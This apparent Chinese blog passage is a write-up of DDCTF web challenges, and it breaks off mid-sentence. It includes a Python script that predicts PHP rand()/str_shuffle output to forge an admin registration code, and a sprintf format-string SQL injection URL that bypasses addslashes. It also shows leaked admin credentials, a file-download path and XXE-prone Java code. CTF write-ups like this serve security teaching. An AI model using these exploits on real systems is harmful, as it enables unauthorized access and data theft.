    <content type="html"><![CDATA[<a id="more"></a><h2 id="我的博客"><a href="#我的博客" class="headerlink" title="我的博客"></a>我的博客</h2><blockquote><p>提示：<a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a></p></blockquote><p>&emsp;&emsp;根据提示能找到网站备份文件，下载后只有三个文件，从代码上并没有发现什么漏洞，而我们的目标是注册一个标志位是<code>admin</code>的账号，其本身存在的<code>admin</code>是个弱密码，但这个账号并没有admin的标志位，所以我们只能自己想办法注册一个。首先看看注册部分关键的代码：<br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"><span class="hljs-keyword">include</span>(<span class="hljs-string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span>($_SERVER[<span class="hljs-string">'REQUEST_METHOD'</span>] === <span class="hljs-string">"POST"</span>) &#123;</span><br><span class="line">    <span class="hljs-keyword">if</span>(!(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'csrf'</span>]) <span class="hljs-keyword">and</span> (string)$_POST[<span class="hljs-string">'csrf'</span>] === $_SESSION[<span class="hljs-string">'csrf'</span>])) &#123;</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">"CSRF token error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $admin = <span class="hljs-string">"admin###"</span> . substr(str_shuffle(<span class="hljs-string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>), <span class="hljs-number">0</span>, <span class="hljs-number">32</span>);</span><br><span class="line">    $username = (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'username'</span>]) === <span class="hljs-keyword">true</span> &amp;&amp; $_POST[<span class="hljs-string">'username'</span>] !== <span class="hljs-string">''</span>) ? (string)$_POST[<span class="hljs-string">'username'</span>] : <span class="hljs-keyword">die</span>(<span class="hljs-string">'Missing username'</span>);</span><br><span class="line">    $password = (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'password'</span>]) === <span class="hljs-keyword">true</span> &amp;&amp; $_POST[<span class="hljs-string">'password'</span>] !== <span class="hljs-string">''</span>) ? (string)$_POST[<span class="hljs-string">'password'</span>] : <span class="hljs-keyword">die</span>(<span class="hljs-string">'Missing password'</span>);</span><br><span class="line">    $code = (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'code'</span>]) === <span class="hljs-keyword">true</span>) ? (string)$_POST[<span class="hljs-string">'code'</span>] : <span class="hljs-string">''</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> (strlen($username) &gt; <span class="hljs-number">32</span> || strlen($password) &gt; <span class="hljs-number">32</span>) &#123;</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">'Invalid input'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $sth = $pdo-&gt;prepare(<span class="hljs-string">'SELECT username FROM users WHERE username = :username'</span>);</span><br><span class="line">    $sth-&gt;execute([<span class="hljs-string">':username'</span> =&gt; $username]);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> ($sth-&gt;fetch() !== <span class="hljs-keyword">false</span>) &#123;</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">'username has been registered'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span>($code === $admin) &#123;</span><br><span class="line">        $identity = <span class="hljs-string">"admin"</span>;</span><br><span class="line">    &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">        $identity = <span class="hljs-string">"guest"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ....</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;可以看到我们只有让我们post的<code>$code</code>与<code>$admin</code>的值相等才能通过验证，而<code>$admin</code>的值又是经过<code>str_shuffle</code>随机打乱的<code>32</code>个字符。而<code>str_shuffle</code>的源码如下：</p><p><div align="center"><br>    <img src="/images/posts/ddctf/43.png" height="60%"><br></div><br>&emsp;&emsp;可以看到它使用了<code>rand()</code>作为随机数产生器，从而打乱字符顺序，而<code>rand()</code>产生的并不是<code>真的</code>随机数而是个伪随机数。我们可以通过下面的公式去预测第<code>32</code>位以后的随机数。<br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP_RAND_MAX = <span class="hljs-number">2147483647</span></span><br><span class="line">num[n] = (num[n<span class="hljs-number">-3</span>] + num[n<span class="hljs-number">-31</span>]) mod (PHP_RAND_MAX)</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;当我们知道了生成的随机数我们就能预测出<code>str_shuffle</code>打乱的结果，最终在这道题中注册一个admin权限的账号。下面是payload：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">PHP_RAND_MAX = <span class="hljs-number">2147483647</span></span><br><span class="line">url = <span class="hljs-string">'http://116.85.39.110:5032/a8e794800ac5c088a73b6b9b38b38c8d/register.php'</span></span><br><span class="line">sess = requests.session()</span><br><span class="line"><span class="hljs-comment"># num[n] = (num[n-3] + num[n-31]) mod (PHP_RAND_MAX)</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">RAND_RANGE</span><span class="hljs-params">(__n, __min, __max, __tmax)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">return</span> (__min) + int(((__max) - (__min) + <span class="hljs-number">1.0</span>) * ((__n) / ((__tmax) + <span class="hljs-number">1.0</span>)))</span><br><span class="line"><span class="hljs-comment"># 仿照PHP版的shuffle</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">shuffle</span><span class="hljs-params">(strs, tokens)</span>:</span></span><br><span class="line">    lens = len(strs)</span><br><span class="line">    strs = list(strs)</span><br><span class="line">    n_left = lens</span><br><span class="line">    i = <span class="hljs-number">0</span></span><br><span class="line">    <span class="hljs-keyword">while</span> (n_left &gt; <span class="hljs-number">0</span>):</span><br><span class="line">        n_left -= <span class="hljs-number">1</span></span><br><span class="line">        rnd_idx = tokens[i]</span><br><span class="line">        i += <span class="hljs-number">1</span></span><br><span class="line">        rnd_idx = RAND_RANGE(rnd_idx, <span class="hljs-number">0</span> ,n_left, PHP_RAND_MAX)</span><br><span class="line">        <span class="hljs-keyword">if</span> (rnd_idx != n_left):</span><br><span class="line">            strs[rnd_idx], strs[n_left] = strs[n_left], strs[rnd_idx]</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>.join(strs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">num = []</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">32</span>):</span><br><span class="line">    html = sess.get(url)</span><br><span class="line">    context = html.content</span><br><span class="line">    soup = BeautifulSoup(context, <span class="hljs-string">'lxml'</span>)</span><br><span class="line">    csrf = soup.select(<span class="hljs-string">'#csrf'</span>)[<span class="hljs-number">0</span>].get(<span class="hljs-string">'value'</span>)</span><br><span class="line">    <span class="hljs-keyword">if</span> i == <span class="hljs-number">31</span>:</span><br><span class="line">        tmp = (num[i - <span class="hljs-number">3</span>] + num[i - <span class="hljs-number">31</span>]) % PHP_RAND_MAX</span><br><span class="line">        <span class="hljs-keyword">if</span> tmp == int(csrf):</span><br><span class="line">            print(<span class="hljs-string">'预测成功！'</span>)</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            print(<span class="hljs-string">'预测失败！'</span>)</span><br><span class="line">            exit(<span class="hljs-number">1</span>)</span><br><span class="line">    num.append(int(csrf))</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 预测后面 62个</span></span><br><span class="line">tokens = []</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">32</span>,<span class="hljs-number">94</span>):</span><br><span class="line">    tmp = (num[i - <span class="hljs-number">3</span>] + num[i - <span class="hljs-number">31</span>]) % PHP_RAND_MAX</span><br><span class="line">    num.append(int(tmp))</span><br><span class="line">    tokens.append(int(tmp))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">strs = <span class="hljs-string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line">code = shuffle(strs, tokens)[:<span class="hljs-number">32</span>]</span><br><span class="line">code = <span class="hljs-string">'admin###'</span> + code</span><br><span class="line"></span><br><span class="line">print(<span class="hljs-string">'预测code: '</span> + code)</span><br><span class="line">print(<span class="hljs-string">'预测csrf: '</span> + str(num[<span class="hljs-number">31</span>]))</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="hljs-comment"># 在访问第33次的时候CSRF应该是上一次的CSRF，也就是第32次，注意这里是从0开始</span></span><br><span class="line">    <span class="hljs-string">'csrf'</span>:num[<span class="hljs-number">31</span>], </span><br><span class="line">    <span class="hljs-string">'username'</span>:<span class="hljs-string">'junay'</span>,</span><br><span class="line">    <span class="hljs-string">'password'</span>:<span class="hljs-string">'123'</span>,</span><br><span class="line">    <span class="hljs-string">'code'</span>:code</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">html = sess.post(url, data)</span><br><span class="line">print(html.content)</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;上面的程序预测的时候有可能存在1/-1的误差，如果出现预测失败重新运行几次即可。</p><p>&emsp;&emsp;有了账号后，我们就能登录，然后审计登录后的代码：<br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// index.php 截取关键代码</span></span><br><span class="line"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'id'</span>]))&#123;</span><br><span class="line">    $id = addslashes($_GET[<span class="hljs-string">'id'</span>]);</span><br><span class="line">    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'title'</span>]))&#123;</span><br><span class="line">        $title = addslashes($_GET[<span class="hljs-string">'title'</span>]);</span><br><span class="line">        $title = sprintf(<span class="hljs-string">"AND title='%s'"</span>, $title);</span><br><span class="line">    &#125;<span class="hljs-keyword">else</span>&#123;</span><br><span class="line">        $title = <span class="hljs-string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $sql = sprintf(<span class="hljs-string">"SELECT * FROM article WHERE id='%s' $title"</span>, $id);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">foreach</span> ($pdo-&gt;query($sql) <span class="hljs-keyword">as</span> $row) &#123;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h1&gt;"</span>.$row[<span class="hljs-string">'title'</span>].<span class="hljs-string">"&lt;/h1&gt;&lt;br&gt;"</span>.$row[<span class="hljs-string">'content'</span>];</span><br><span class="line">        <span class="hljs-keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;这个代码中使用了存在漏洞的<code>sprintf</code>函数，我们可以通过格式化漏洞绕过<code>addslashes</code>。在格式化的时候sprintf支持填充，我们可以使用<code>%1$&#39;</code>绕过反斜杠。</p><p><div align="center"><br>    <img src="/images/posts/ddctf/44.png" height="60%"><br></div><br>&emsp;&emsp;所以我们的payload就是：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://116.85.39.110:5032/a8e794800ac5c088a73b6b9b38b38c8d/index.php?id=1&amp;title=Welcome%1$&apos; union select 1,f14g,3 from `key` limit 0,1 -- +</span><br></pre></td></tr></table></figure></p><h2 id="喝杯Java冷静下"><a href="#喝杯Java冷静下" class="headerlink" title="喝杯Java冷静下"></a>喝杯Java冷静下</h2><p>&emsp;&emsp;首先能在源代码中找到账号密码：</p><p><div align="center"><br>    <img src="/images/posts/ddctf/45.png" height="60%"><br></div><br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 解开后</span><br><span class="line">admin: admin_password_2333_caicaikan</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;使用这个账号密码我们能登录进后台，在后台里我们可以发现一个<code>文件下载</code>的漏洞。<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// url</span><br><span class="line">http://116.85.48.104:5036/gd5Jq3XoKvGKqu5tIH2p/rest/user/getInfomation?filename=informations/readme.txt</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;按照上次Java web的题目，我们开始找配置文件，比如：web.xml、applicationContext.xml等，但当我们找<code>class</code>文件时，却没有收获，但是匹配文件中的包名给我思路。</p><p><div align="center"><br>    <img src="/images/posts/ddctf/46.png" height="60%"><br></div><br>&emsp;&emsp;在<code>GitHub</code>上搜了一下，果然找到了这个框架。地址：<a href="https://github.com/Eliteams/quick4j" target="_blank">quick4j</a>。然后按照这个项目的路径我们就能找到关键的类，最终能找到的文件差不多如下：</p><p><div align="center"><br>    <img src="/images/posts/ddctf/47.png" height="50%"><br></div><br>&emsp;&emsp;标注的文件是控制文件，也是我们需要关注的文件，其内容如下：<br><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">package</span> com.eliteams.quick4j.web.controller;</span><br><span class="line"><span class="hljs-comment">// 删除了导入包</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">@Controller</span></span><br><span class="line"><span class="hljs-meta">@RequestMapping</span>(&#123;<span class="hljs-string">"/user"</span>&#125;)</span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserController</span></span></span><br><span class="line"><span class="hljs-class"></span>&#123;</span><br><span class="line">  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String hintFile = <span class="hljs-string">"/flag/hint.txt"</span>;</span><br><span class="line">  <span class="hljs-meta">@Resource</span></span><br><span class="line">  <span class="hljs-keyword">private</span> UserService userService;</span><br><span class="line">  </span><br><span class="line">  <span class="hljs-meta">@RequestMapping</span>(value=&#123;<span class="hljs-string">"/login"</span>&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.POST&#125;)</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">login</span><span class="hljs-params">(@Valid User user, BindingResult result, Model model, HttpServletRequest request)</span></span></span><br><span class="line"><span class="hljs-function">  </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      Subject subject = SecurityUtils.getSubject();</span><br><span class="line">      <span class="hljs-keyword">if</span> (subject.isAuthenticated()) &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-string">"redirect:/"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="hljs-keyword">if</span> (result.hasErrors())</span><br><span class="line">      &#123;</span><br><span class="line">        model.addAttribute(<span class="hljs-string">"error"</span>, <span class="hljs-string">"参数错误！"</span>);</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-string">"login"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="hljs-keyword">if</span> ((user.getUsername().isEmpty()) || (user.getUsername() == <span class="hljs-keyword">null</span>) || </span><br><span class="line">        (user.getPassword().isEmpty()) || (user.getPassword() == <span class="hljs-keyword">null</span>)) &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-string">"login"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      subject.login(<span class="hljs-keyword">new</span> UsernamePasswordToken(user.getUsername(), user.getPassword()));</span><br><span class="line">      </span><br><span class="line">      User authUserInfo = <span class="hljs-keyword">this</span>.userService.selectByUsername(user.getUsername());</span><br><span class="line">      request.getSession().setAttribute(<span class="hljs-string">"userInfo"</span>, authUserInfo);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">catch</span> (AuthenticationException e)</span><br><span class="line">    &#123;</span><br><span class="line">      model.addAttribute(<span class="hljs-string">"error"</span>, <span class="hljs-string">"用户名或密码错误 ！"</span>);</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-string">"login"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-string">"redirect:/"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="hljs-meta">@RequestMapping</span>(value=&#123;<span class="hljs-string">"/logout"</span>&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.GET&#125;)</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">logout</span><span class="hljs-params">(HttpSession session)</span></span></span><br><span class="line"><span class="hljs-function">  </span>&#123;</span><br><span class="line">    session.removeAttribute(<span class="hljs-string">"userInfo"</span>);</span><br><span class="line">    </span><br><span class="line">    Subject subject = SecurityUtils.getSubject();</span><br><span class="line">    subject.logout();</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-string">"login"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="hljs-meta">@RequestMapping</span>(value=&#123;<span class="hljs-string">"/admin"</span>&#125;, produces=&#123;<span class="hljs-string">"text/html;charset=UTF-8"</span>&#125;)</span><br><span class="line">  <span class="hljs-meta">@ResponseBody</span></span><br><span class="line">  <span class="hljs-meta">@RequiresRoles</span>(&#123;<span class="hljs-string">"admin"</span>&#125;)</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">admin</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">  </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-string">"拥有admin角色,能访问"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="hljs-meta">@RequestMapping</span>(value=&#123;<span class="hljs-string">"/create"</span>&#125;, produces=&#123;<span class="hljs-string">"text/html;charset=UTF-8"</span>&#125;)</span><br><span class="line">  <span class="hljs-meta">@ResponseBody</span></span><br><span class="line">  <span class="hljs-meta">@RequiresPermissions</span>(&#123;<span class="hljs-string">"user:create"</span>&#125;)</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">create</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">  </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-string">"拥有user:create权限,能访问"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="hljs-meta">@RequestMapping</span>(value=&#123;<span class="hljs-string">"/getInfomation"</span>&#125;, produces=&#123;<span class="hljs-string">"text/html;charset=UTF-8"</span>&#125;)</span><br><span class="line">  <span class="hljs-meta">@ResponseBody</span></span><br><span class="line">  <span class="hljs-meta">@RequiresRoles</span>(&#123;<span class="hljs-string">"guest"</span>&#125;)</span><br><span class="line">  <span class="hljs-keyword">public</span> ResponseEntity&lt;<span class="hljs-keyword">byte</span>[]&gt; download(HttpServletRequest request, String filename)</span><br><span class="line">    <span class="hljs-keyword">throws</span> IOException</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="hljs-keyword">if</span> ((filename.contains(<span class="hljs-string">"../"</span>)) || (filename.contains(<span class="hljs-string">"./"</span>)) || (filename.contains(<span class="hljs-string">"..\\"</span>)) || (filename.contains(<span class="hljs-string">".\\"</span>))) &#123;</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    String path = request.getServletContext().getRealPath(<span class="hljs-string">"/"</span>);</span><br><span class="line">    System.out.println(path);</span><br><span class="line">    </span><br><span class="line">    File file = <span class="hljs-keyword">new</span> File(path + File.separator + filename);</span><br><span class="line">    HttpHeaders headers = <span class="hljs-keyword">new</span> HttpHeaders();</span><br><span class="line">    </span><br><span class="line">    String downloadFielName = <span class="hljs-keyword">new</span> String(filename.getBytes(<span class="hljs-string">"UTF-8"</span>), <span class="hljs-string">"iso-8859-1"</span>);</span><br><span class="line">    </span><br><span class="line">    headers.setContentDispositionFormData(<span class="hljs-string">"attachment"</span>, downloadFielName);</span><br><span class="line">    </span><br><span class="line">    headers.setContentType(MediaType.APPLICATION_OCTET_STREAM);</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResponseEntity(FileUtils.readFileToByteArray(file), headers, HttpStatus.CREATED);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="hljs-meta">@RequestMapping</span>(value=&#123;<span class="hljs-string">"/nicaicaikan_url_23333_secret"</span>&#125;, produces=&#123;<span class="hljs-string">"text/html;charset=UTF-8"</span>&#125;)</span><br><span class="line">  <span class="hljs-meta">@ResponseBody</span></span><br><span class="line">  <span class="hljs-meta">@RequiresRoles</span>(&#123;<span class="hljs-string">"super_admin"</span>&#125;)</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">xmlView</span><span class="hljs-params">(String xmlData)</span></span></span><br><span class="line"><span class="hljs-function">  </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">if</span> (xmlData.length() &gt;= <span class="hljs-number">1000</span>) &#123;</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-string">"Too long~~"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();</span><br><span class="line">    </span><br><span class="line">    factory.setExpandEntityReferences(<span class="hljs-keyword">true</span>);</span><br><span class="line">    <span class="hljs-keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      DocumentBuilder builder = factory.newDocumentBuilder();</span><br><span class="line">      </span><br><span class="line">      InputStream xmlInputStream = <span class="hljs-keyword">new</span> ByteArrayInputStream(xmlData.getBytes());</span><br><span class="line">      </span><br><span class="line">      Document localDocument = builder.parse(xmlInputStream);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">catch</span> (ParserConfigurationException e)</span><br><span class="line">    &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-string">"ParserConfigurationException"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">catch</span> (SAXException e)</span><br><span class="line">    &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-string">"SAXException"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">catch</span> (IOException e)</span><br><span class="line">    &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-string">"IOException"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-string">"ok~ try to read /flag/hint.txt"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;所以我们下一步就需要访问<code>nicaicaikan_url_23333_secret</code>，但是已经有的<code>admin</code>账号并不是<code>super_admin</code>，而且也没有注册账号的接口存在。这种情况下只能照着GitHub上的模板去翻其他文件，终于在<code>SecurityRealm.java</code>中找到了线索：</p><p><div align="center"><br>    <img src="/images/posts/ddctf/48.png" height="60%"><br></div><br>&emsp;&emsp;这里注意到我们需要找到一个字符串的<code>hashCode()==0</code>，经过Google后，我们能在Stack 